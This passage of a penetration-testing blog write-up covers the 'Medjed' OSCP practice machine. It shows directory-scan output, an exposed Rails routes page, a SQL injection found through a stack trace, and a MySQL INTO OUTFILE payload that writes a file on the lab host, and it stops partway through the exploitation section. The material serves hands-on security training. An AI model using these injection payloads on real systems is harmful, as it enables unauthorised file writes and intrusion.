class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7800e9c90c36d1b96037e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I could pillage through all the files here, but the server was lagging to the point of being unusuable. Also, I doubt this is intended by the box creator, so I’ll move on.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f7806baf36ce2836565dbd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f78044bd89f66bb69e7eac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Admin Panel:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f7807d99dac3b16a23c0ee" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_menu.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_menu.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780caa087c434834b7962" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The admin panel is found under the “Menu” tab. Clicking it redirects to port 44330 running HTTPS.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7803f8f03d4cd290ac054" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_panel.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_panel.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780789175c50764383722" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since this is a fresh install and I’m the only user, it’s unlikely the config or user management sections contain anything useful. The Application Manager looks interesting though.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780308550e544a352167d" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_appmgr.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_appmgr.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7808ca79fe68de5492259" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It lists three apps, all of which are dynamic LSP applications.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780e1840afa8f79c75e6e" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_config-wizard.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_config-wizard.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7806e80c4e004c96acc8c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to the docs, new LSP applications can be deployed here, provided the required files are already present on the server. It’s potentially another escalation path, I’ll revisit this once a foothold is gained.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7805ea706ed5397914b39" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_appmgr_help.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_admin_appmgr_help.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f780e8b727c9e96c177ef8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f78046a619c36367d84888" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP45332, TCP45443 — Quiz App:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f7801bb36ae555ffd2b98f" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_landing.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_landing.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f7804c8029d24ca50d922d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Port 45332 is running a very simple PHP app that presents 4 multiple-choice questions, and shows the answers afterwards.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780568e07c63ca0cc4d39" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_qs.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_qs.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7801fa5d1c1de7bedc30e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It doesn’t send any requests out, everything is handled by JavaScript.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780c79f3dc680429a8bc0" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_js.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_js.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f7809bbff5c39f43f486c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Directory busting also found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">phpinfo.php</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f7806c8b13ef1f74c01f21" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://192.168.200.127:45332 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.200.127:45332
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 887]
+/.htaccess            (Status: 403) [Size: 308]
+/.                    (Status: 200) [Size: 887]
+/styles.css           (Status: 200) [Size: 1266]
+/phpinfo.php          (Status: 200) [Size: 90795]
+/.html                (Status: 403) [Size: 308]
+/script.js            (Status: 200) [Size: 3023]</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780c5ba33db8e6f428bad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It reveals the app’s web root: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\xampp\htdocs</code></span><span class="SemanticString">. It might be important for later.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7800db797e490e2c85929" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_webroot.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_quiz_webroot.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f780898b78fe21fc5bc8f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f780378b26d26b5a6dae3b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP33033 — Rails App:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f7801ab565fd07ec59cccb" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_landing.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_landing.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78016accbd58dd16dc6f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Port 33033 is a Rails app. The landing page simply lists all the users and their profiles. There doesn’t seem to be any naming convention, with multiple username formats found. Jerren appears to be the sysadmin, based on his username </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jerren.devops</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78042ac6fd12febcd06e9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The button at the top right leads to a login page.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78034b497ce8f283276af" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_login.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_login.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780fb8f9cc57213935b22" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The login form does not seem injectable, and it does not return any error messages either.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780de956bf6ae2e4632e8" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_forgot.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_forgot.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7803ea253eb3fc6fe43dc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s also a password reset function, which requires entering a reminder phrase. I tried with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString"> but failed. The error message did however tell me that the user does not exist.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78043b6b8ccd9335e5e64" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_admin_fail.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_admin_fail.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780c19836ca4201cec53e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For example, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">joe.webb</code></span><span class="SemanticString"> gives a different error:</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7808b81f4e3a9d0516253" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_joe_fail.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_joe_fail.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7808baa12c2f7e5547c1a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Other than that, there’s not much more to look at. Since I don’t see any paths forward here, I’ll review what feroxbuster found in the background.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f78026b1e3e4a71e2a27c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25d0b98a88f780aba3d2d7e08b38381e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">NOTE: According to the official walkthrough, the intended path here is to look at Jerren’s profile, guess his reminder phrase is “paranoid” to reset his password and log in to the app. I didn’t figure this out when I worked on the box, so I did it another way. I find the guessing part rather far-fetched, and having this as the intended path seems somewhat questionable in my opinion.</em></span></span></p></div><div id="https://www.notion.so/25c0b98a88f78096a419fe0c4f6e32aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f780e9be54ea4274ee1246" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Slug Endpoint:</strong></span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780f58c53e31a7c37385f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> feroxbuster -u http://192.168.200.127:33033 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10 
+                                                                                                                                                                                                                                            
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.200.127:33033
+ 🚀  Threads               │ 10
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET     1183l     2424w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      119l      187w     3708c http://192.168.200.127:33033/users
+200      GET       43l       86w     1630c http://192.168.200.127:33033/users/reminder
+302      GET        1l        5w      673c http://192.168.200.127:33033/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBDdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--6c04dcc2bccb7faf94f362af6b374bf4a6202f92/image.jpeg =&gt; http://192.168.200.127:33033/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9JYTJWNVNTSWhlbUkzWkRGME9EY3dibW80TlROak1uVm5ZV2R3TjNvd04zUnpid1k2QmtWVU9oQmthWE53YjNOcGRHbHZia2tpUDJsdWJHbHVaVHNnWm1sc1pXNWhiV1U5SW1sdFlXZGxMbXB3WldjaU95Qm1hV3hsYm1GdFpTbzlWVlJHTFRnbkoybHRZV2RsTG1wd1pXY0dPd1pVT2hGamIyNTBaVzUwWDNSNWNHVkpJZzlwYldGblpTOXFjR1ZuQmpzR1ZBPT0iLCJleHAiOiIyMDI1LTA4LTI2VDEzOjAxOjM4LjA3NloiLCJwdXIiOiJibG9iX2tleSJ9fQ==--06a3ccf468a9206beeff426684fa707eb9f502d3/image.jpeg?content_type=image%2Fjpeg&amp;disposition=inline%3B+filename%3D%22image.jpeg%22%3B+filename%2A%3DUTF-8%27%27image.jpeg
+302      GET        1l        5w      676c http://192.168.200.127:33033/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--64a4832c53ff2cb3aeb198d3f3a4782aed180bac/image2.jpeg =&gt; http://192.168.200.127:33033/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9JYTJWNVNTSWhkVGczZFRsd01tUjNPR05pY25Zd2JuUnBlbmswZDJaNVkySXdNd1k2QmtWVU9oQmthWE53YjNOcGRHbHZia2tpUVdsdWJHbHVaVHNnWm1sc1pXNWhiV1U5SW1sdFlXZGxNaTVxY0dWbklqc2dabWxzWlc1aGJXVXFQVlZVUmkwNEp5ZHBiV0ZuWlRJdWFuQmxad1k3QmxRNkVXTnZiblJsYm5SZmRIbHdaVWtpRDJsdFlXZGxMMnB3WldjR093WlUiLCJleHAiOiIyMDI1LTA4LTI2VDEzOjAxOjM4LjgwMVoiLCJwdXIiOiJibG9iX2tleSJ9fQ==--eab697035b3579b6ed9b8ea6945e56fa78259b6c/image2.jpeg?content_type=image%2Fjpeg&amp;disposition=inline%3B+filename%3D%22image2.jpeg%22%3B+filename%2A%3DUTF-8%27%27image2.jpeg
+302      GET        1l        5w      791c http://192.168.200.127:33033/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBDUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--3abb79eaf1dd95d8aba0c814ccb65dd30795f4d4/thiscatdoesnotexist.com.jpeg =&gt; http://192.168.200.127:33033/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9JYTJWNVNTSWhlWGR2WWpKbFkyOHdhWE4wY25ReGJ6WnhiV3BtWW1wdmRuQmxPUVk2QmtWVU9oQmthWE53YjNOcGRHbHZia2tpWTJsdWJHbHVaVHNnWm1sc1pXNWhiV1U5SW5Sb2FYTmpZWFJrYjJWemJtOTBaWGhwYzNRdVkyOXRMbXB3WldjaU95Qm1hV3hsYm1GdFpTbzlWVlJHTFRnbkozUm9hWE5qWVhSa2IyVnpibTkwWlhocGMzUXVZMjl0TG1wd1pXY0dPd1pVT2hGamIyNTBaVzUwWDNSNWNHVkpJZzlwYldGblpTOXFjR1ZuQmpzR1ZBPT0iLCJleHAiOiIyMDI1LTA4LTI2VDEzOjAxOjQwLjQ1MloiLCJwdXIiOiJibG9iX2tleSJ9fQ==--d5ba856cbc909a3bd7cf6f569ee320c42a0581c4/thiscatdoesnotexist.com.jpeg?content_type=image%2Fjpeg&amp;disposition=inline%3B+filename%3D%22thiscatdoesnotexist.com.jpeg%22%3B+filename%2A%3DUTF-8%27%27thiscatdoesnotexist.com.jpeg
+302      GET        1l        5w      673c http://192.168.200.127:33033/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBDQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef2f596261aa7e3da359c4d8f5a9a83b6860d11b/image.jpeg =&gt; http://192.168.200.127:33033/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9JYTJWNVNTSWhNakJwTVc5cGRUZzNkbXhqYkRNMWVHUTJablp6T0RZMmJuRmlaUVk2QmtWVU9oQmthWE53YjNOcGRHbHZia2tpUDJsdWJHbHVaVHNnWm1sc1pXNWhiV1U5SW1sdFlXZGxMbXB3WldjaU95Qm1hV3hsYm1GdFpTbzlWVlJHTFRnbkoybHRZV2RsTG1wd1pXY0dPd1pVT2hGamIyNTBaVzUwWDNSNWNHVkpJZzlwYldGblpTOXFjR1ZuQmpzR1ZBPT0iLCJleHAiOiIyMDI1LTA4LTI2VDEzOjAxOjQwLjY1MloiLCJwdXIiOiJibG9iX2tleSJ9fQ==--d3de54c53bf80cc1798c2e5e8670d5be97d09041/image.jpeg?content_type=image%2Fjpeg&amp;disposition=inline%3B+filename%3D%22image.jpeg%22%3B+filename%2A%3DUTF-8%27%27image.jpeg
+200      GET       43l       78w     1523c http://192.168.200.127:33033/login
+200      GET      119l      187w     3708c http://192.168.200.127:33033/
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>200      GET      725l     1230w    18286c http://192.168.200.127:33033/rails/info/routes</span></mark></span><span class="SemanticString"><span>
+404      GET     1223l     2564w    39772c http://192.168.200.127:33033/assets
+302      GET        1l        5w      100c http://192.168.200.127:33033/logout =&gt; http://192.168.200.127:33033/login
+200      GET       67l      181w     1722c http://192.168.200.127:33033/404
+404      GET        0l        0w    37323c http://192.168.200.127:33033/267
+200      GET       66l      165w     1635c http://192.168.200.127:33033/500
+200      GET       67l      176w     1705c http://192.168.200.127:33033/422
+404      GET        1l        3w       14c http://192.168.200.127:33033/cable
+[&gt;-------------------] - 9m      9361/220574  3h      found:16      errors:29     
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_200_127:33033-1756213531.state ...
+[&gt;-------------------] - 9m      9362/220574  3h      found:16      errors:29     
+[&gt;-------------------] - 9m      9323/220545  17/s    http://192.168.200.127:33033/</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780b59251cc7ab49a3f72" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The directory scan found an interesting endpoint </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/rails/info/routes</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7805fade9cf30ace9343b" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_routes.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_routes.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78067bd7fe26a605398f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://guides.rubyonrails.org/v5.0.6/routing.html">Rails docs</a></span><span class="SemanticString">, this endpoint lists out all the available routes, and it’s only available if the app is running in development mode. Most of them requires authentication, but </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/slug</code></span><span class="SemanticString"> doesn’t.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780d2a1ade2312fb21ccb" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_slug.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_slug.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78048b9bfd7cbe5fb24e9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://en.wikipedia.org/wiki/Clean_URL#Slug">slug</a></span><span class="SemanticString"> typically refers to a short user- or SEO-friendly text used in URLs to identify and describe a resource. Looks like the endpoint is for generating slugs based on a user’s profile.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f780698f4adb2462d7cbb4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried searching with several usernames found earlier, but it never returns any results. Then I tried searching with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">asdf&#x27;</code></span><span class="SemanticString">, and it crashed with a full stack trace.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7806998ccc2a07a341b46" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_crash.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_crash.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78080b033c0862c3ba7fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">That’s SQL injection! The error message also revealed the Rails root: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:/Sites/userpro</code></span><span class="SemanticString"> and the exact SQL statement: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SELECT username FROM users WHERE username = &#x27;&lt;input&gt;&#x27;</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f7803a855cf4c93436af69" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f781cda209fa1ef26d6849" class="Divider"></div><h3 id="https://www.notion.so/25c0b98a88f781438a30c7972b8eedfb" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/25c0b98a88f781438a30c7972b8eedfb"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/25c0b98a88f7805d88acdb3f2b31175d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SQL Injection:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f7805e8afcecd1c58795fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Normally I would fire up </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sqlmap</code></span><span class="SemanticString"> and let it perform magic, but since this is an OSCP practice, I’ll do it manually instead. Having knowledge of the exact SQL statement also makes exploitation much easier.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780b18022e0953eea75c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first check if I’m able to write to files using MySQL’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://hackviser.com/tactics/pentesting/services/mysql#executing-commands-via-sql-read--write-operations">INTO OUTFILE</a></span><span class="SemanticString"> clause.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780328b6bcffccb0b2929" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Payload:</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f780e1b80ae1dfb0d54604" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' INTO OUTFILE '</span>C:<span class="token operator">/</span>Windows<span class="token operator">/</span><span class="token keyword">Temp</span><span class="token operator">/</span>test<span class="token punctuation">.</span>txt'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f78065a10fe3426f156eac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve sent the payload, and it did not return any error. However, sending it again caused a crash with an error message complaining the file already exists. File write successful.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78003b7cae86d027825d9" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_write.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_write.png" style="width:100%"/></a><figcaption><span 